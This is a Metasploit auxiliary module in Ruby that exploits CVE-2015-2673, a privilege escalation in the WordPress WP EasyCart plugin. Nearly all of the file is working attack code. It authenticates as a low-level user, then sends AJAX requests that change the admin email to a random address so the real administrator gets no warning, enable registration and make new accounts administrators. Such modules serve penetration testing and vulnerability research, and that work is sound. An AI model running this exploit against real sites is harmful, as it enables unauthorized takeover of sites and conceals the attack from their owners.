##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress

  def initialize(info = {})
    super(update_info(
      info,
      'Name'            => 'WordPress WP EasyCart Plugin Privilege Escalation',
      'Description'     => %q{
        The WordPress WP EasyCart plugin from version 1.1.30 to 3.0.20 allows authenticated
        users of any user level to set any system option via a lack of validation in the
        ec_ajax_update_option and ec_ajax_clear_all_taxrates functions located in
        /inc/admin/admin_ajax_functions.php. The module first changes the admin e-mail address
        to prevent any notifications being sent to the actual administrator during the attack,
        re-enables user registration in case it has been disabled and sets the default role to
        be administrator. This will allow for the user to create a new account with admin
        privileges via the default registration page found at /wp-login.php?action=register.
      },
      'Author'          =>
        [
          'rastating' # Discovery and Metasploit module
        ],
      'License'         => MSF_LICENSE,
      'References'      =>
        [
          ['CVE', '2015-2673'],
          ['WPVDB', '7808'],
          ['URL', 'https://rastating.github.io/wp-easycart-privilege-escalation-information-disclosure/']
        ],
      'DisclosureDate'  => 'Feb 25 2015'
      ))

    register_options(
      [
        OptString.new('USERNAME', [true, 'The WordPress username to authenticate with']),
        OptString.new('PASSWORD', [true, 'The WordPress password to authenticate with'])
      ])
  end

  def check
    check_plugin_version_from_readme('wp-easycart', '3.0.21', '1.1.30')
  end

  def username
    datastore['USERNAME']
  end

  def password
    datastore['PASSWORD']
  end

  def set_wp_option(name, value, cookie)
    res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => wordpress_url_admin_ajax,
      'vars_get'  => { 'action' => 'ec_ajax_update_option' },
      'vars_post' => { 'option_name' => name, 'option_value' => value },
      'cookie'    => cookie
    )

    if res.nil?
      vprint_error("No response from the target.")
    elsif res.code != 200
      vprint_warning("Server responded with status code #{res.code}")
    end

    res
  end

  def run
    print_status("Authenticating with WordPress using #{username}:#{password}...")
    cookie = wordpress_login(username, password)
    if cookie.nil?
      print_error("Failed to authenticate with WordPress")
      return
    end
    store_valid_credential(user: username, private: password, proof: cookie)
    print_good("Authenticated with WordPress")

    new_email = "#{Rex::Text.rand_text_alpha(5)}@#{Rex::Text.rand_text_alpha(5)}.com"
    print_status("Changing admin e-mail address to #{new_email}...")
    if set_wp_option('admin_email', new_email, cookie).nil?
      print_error("Failed to change the admin e-mail address")
      return
    end

    print_status("Enabling user registrations...")
    if set_wp_option('users_can_register', 1, cookie).nil?
      print_error("Failed to enable user registrations")
      return
    end

    print_status("Setting the default user role...")
    if set_wp_option('default_role', 'administrator', cookie).nil?
      print_error("Failed to set the default user role")
      return
    end

    register_url = normalize_uri(target_uri.path, 'wp-login.php?action=register')
    print_good("Privilege escalation complete")
    print_good("Create a new account at #{register_url} to gain admin access.")
  end
end
